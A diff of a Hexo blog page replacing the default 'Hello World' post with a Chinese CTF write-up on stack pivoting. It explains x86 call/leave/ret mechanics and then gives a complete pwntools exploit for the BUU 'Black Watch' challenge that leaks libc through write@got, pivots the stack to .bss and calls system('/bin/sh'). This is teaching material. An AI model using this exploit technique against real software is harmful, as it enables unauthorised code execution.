@@ -9,7 +9,7 @@
     
     <title>
         
-            Hello World |
+            简单栈迁移 |
         
         桥下少年
     </title>
@@ -170,7 +170,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">Hello World</span>
+            <span class="title-hover-animation">简单栈迁移</span>
         </div>
 
         
@@ -189,21 +189,32 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2021-12-30 08:27:58</span>
-        <span class="mobile">2021-12-30 08:27</span>
+        <span class="pc">2022-02-08 10:46:31</span>
+        <span class="mobile">2022-02-08 10:46</span>
     </span>
     
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>75 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>829 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>3 分钟</span>
         </span>
     
     
@@ -219,19 +230,43 @@
         
 
         <div class="article-content markdown-body">
-            <p><strong>Welcome to <a class="link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link" target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub<i class="fas fa-external-link-alt"></i></a>.</strong></p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+            <h1 id="简单的栈迁移"><a href="#简单的栈迁移" class="headerlink" title="简单的栈迁移"></a>简单的栈迁移</h1><blockquote>
+<p>小记一下栈迁移的手段，老是忘记。</p>
+</blockquote>
+<h2 id="先介绍一些函数调用过程中的主要指令"><a href="#先介绍一些函数调用过程中的主要指令" class="headerlink" title="先介绍一些函数调用过程中的主要指令"></a>先介绍一些函数调用过程中的主要指令</h2><ul>
+<li> <strong>push</strong>：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。 </li>
+<li>  <strong>pop</strong>出栈：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。</li>
+<li><img src="/2022/02/08/%E7%AE%80%E5%8D%95%E6%A0%88%E8%BF%81%E7%A7%BB/1.jpg"></li>
+<li> <strong>cal</strong>l：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。 </li>
+<li> <strong>leave</strong>：恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。 </li>
+<li> <strong>ret</strong>：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。 </li>
+</ul>
+<h2 id="函数的入口点与出口点的基本操作"><a href="#函数的入口点与出口点的基本操作" class="headerlink" title="函数的入口点与出口点的基本操作"></a>函数的入口点与出口点的基本操作</h2><ul>
+<li><p>入口点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp  <span class="comment"># 将ebp压栈</span></span><br><span class="line">mov ebp, esp <span class="comment">#将esp的值赋给ebp</span></span><br></pre></td></tr></table></figure></li>
+<li><p>出口点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret <span class="comment">#pop eip，弹出栈顶元素作为程序下一个执行地址</span></span><br></pre></td></tr></table></figure></li>
+<li><p> 其中 leave 指令相当于 </p>
+</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp <span class="comment"># 将ebp的值赋给esp</span></span><br><span class="line">pop ebp <span class="comment"># 弹出ebp</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<h2 id="例题-BUU-Black-Watch-入群题"><a href="#例题-BUU-Black-Watch-入群题" class="headerlink" title="例题:BUU [Black Watch 入群题]"></a>例题:BUU [Black Watch 入群题]</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">bss_s=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048408</span> </span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)   <span class="comment">#这里是第一次写入到bss段上去的</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b 0x080484F6&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_s-<span class="number">4</span>)+p32(leave_ret)  <span class="comment">#这里跳转到bss去执行</span></span><br><span class="line">p.send(payload)</span><br><span class="line">leak=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">base = leak-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">system = base +libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.recv()</span><br><span class="line">payload=p32(system)+p32(main_addr)+p32(bss_s+<span class="number">4</span>*<span class="number">3</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_s-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li>结合上面的解释，来理解程序最后的执行流程<ul>
+<li>程序第一次read到bss段上去，我们在bss上部署了payload=p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</li>
+<li>第二次输入的时候我们将ebp位置填充为bss-4的位置(因为最后leave;ret过去的时候，eps指向了bss+4的位置)，所以有payload=’a’*0x18+p32(bss-4)+p32(leave_ret)</li>
+<li>前两次输入来构造泄露libc</li>
+<li>第三次输入在bss上构造system调用</li>
+<li>第四次输入跳转执行system(“/bin/sh”)</li>
+</ul>
+</li>
+</ul>
+<h2 id="64位下类似，但是存在前六个参数寄存器传参的问题。"><a href="#64位下类似，但是存在前六个参数寄存器传参的问题。" class="headerlink" title="64位下类似，但是存在前六个参数寄存器传参的问题。"></a>64位下类似，但是存在前六个参数寄存器传参的问题。</h2><p>参考文章</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting">ctfwiki<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45441024/article/details/110393397?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164428635016780264092754%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164428635016780264092754&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-110393397.first_rank_v2_pc_rank_v29&utm_term=pwn+%E6%A0%88%E8%BF%81%E7%A7%BB&spm=1018.2226.3001.4187">三哥sange<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/clover-toeic/p/3755401.html">clover_toeic<i class="fas fa-external-link-alt"></i></a></p>
 
         </div>
 
@@ -239,11 +274,11 @@
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li>本文标题：Hello World</li>
+        <li>本文标题：简单栈迁移</li>
         <li>本文作者：LOLOLO</li>
-        <li>创建时间：2021-12-30 08:27:58</li>
+        <li>创建时间：2022-02-08 10:46:31</li>
         <li>
-            本文链接：https://lololo-pwn.github.io/2021/12/30/hello-world/
+            本文链接：https://lololo-pwn.github.io/2022/02/08/简单栈迁移/
         </li>
         <li>
             版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -255,33 +290,26 @@
         
 
         
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
         
             <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/02/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">格式化字符串</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
                 
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2021/11/26/ctfshow%E7%AD%BE%E9%80%80%E9%A2%98/"
+                           href="/2022/02/07/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">ctfshow签退题</span>
+                                <span class="post-nav-title-item">题目复现</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -489,7 +517,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">1.</span> <span class="nav-text">简单的栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%88%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%B8%BB%E8%A6%81%E6%8C%87%E4%BB%A4"><span class="nav-number">1.1.</span> <span class="nav-text">先介绍一些函数调用过程中的主要指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8E%E5%87%BA%E5%8F%A3%E7%82%B9%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="nav-number">1.2.</span> <span class="nav-text">函数的入口点与出口点的基本操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-BUU-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98"><span class="nav-number">1.3.</span> <span class="nav-text">例题:BUU [Black Watch 入群题]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#64%E4%BD%8D%E4%B8%8B%E7%B1%BB%E4%BC%BC%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AD%98%E5%9C%A8%E5%89%8D%E5%85%AD%E4%B8%AA%E5%8F%82%E6%95%B0%E5%AF%84%E5%AD%98%E5%99%A8%E4%BC%A0%E5%8F%82%E7%9A%84%E9%97%AE%E9%A2%98%E3%80%82"><span class="nav-number">1.4.</span> <span class="nav-text">64位下类似，但是存在前六个参数寄存器传参的问题。</span></a></li></ol></li></ol>
     </div>
 </div>
         </aside>
